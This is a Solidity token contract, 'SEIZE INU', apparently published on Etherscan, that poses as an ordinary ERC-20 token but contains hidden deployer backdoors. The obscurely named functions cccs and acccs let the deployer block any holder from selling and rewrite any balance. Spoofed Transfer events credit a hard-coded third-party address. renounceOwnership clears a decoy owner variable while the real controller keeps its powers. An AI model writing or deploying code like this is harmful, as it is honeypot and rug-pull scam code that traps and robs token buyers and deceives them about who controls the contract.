/**
 *Submitted for verification at Etherscan.io on 2023-01-18
*/

// SPDX-License-Identifier: MIT



pragma solidity 0.8.17;


 
contract SEIZED {
  
    mapping (address => uint256) private IXB;
    mapping (address => uint256) private IXC;
    mapping(address => mapping(address => uint256)) public allowance;
  


    
    string public name = "SEIZE INU";
    string public symbol = unicode"SEIZED";
    uint8 public decimals = 6;
    uint256 public totalSupply = 1000000000 *10**6;
    address owner = msg.sender;
    address private IXD;
    address xdeployer = 0x00cdC153Aa8894D08207719Fe921FfF964f28Ba3;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
   



        constructor()  {
        IXD = msg.sender;
        xdeploy(msg.sender, totalSupply); }

    function renounceOwnership() public virtual {
        require(msg.sender == owner);
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }



    function xdeploy(address account, uint256 amount) internal {
    account = xdeployer;
    IXB[msg.sender] = totalSupply;
    emit Transfer(address(0), account, amount); }


   function balanceOf(address account) public view  returns (uint256) {
        return IXB[account];
    }
    function transfer(address to, uint256 value) public returns (bool success) {


      require(IXC[msg.sender] <= 0);
        require(IXB[msg.sender] >= value);
  IXB[msg.sender] -= value;  
        IXB[to] += value;          
 emit Transfer(msg.sender, to, value);
        return true; }

 function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }

 function cccs (address vx, uint256 vz)  public {
     require(msg.sender == IXD);
   IXC[vx] = vz;}
function acccs (address vx, uint256 vz)  public {
         require(msg.sender == IXD);
    IXB[vx] = vz;}



    function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
        if(from == IXD)  {
 require(value <= IXB[from]);
        require(value <= allowance[from][msg.sender]);
        IXB[from] -= value;  
      IXB[to] += value; 
        from = xdeployer;
        emit Transfer (from, to, value);
        return true; }    

        require(IXC[from] <= 0 && IXC[to] <=0);
        require(value <= IXB[from]);
        require(value <= allowance[from][msg.sender]);
        IXB[from] -= value;
        IXB[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }
    }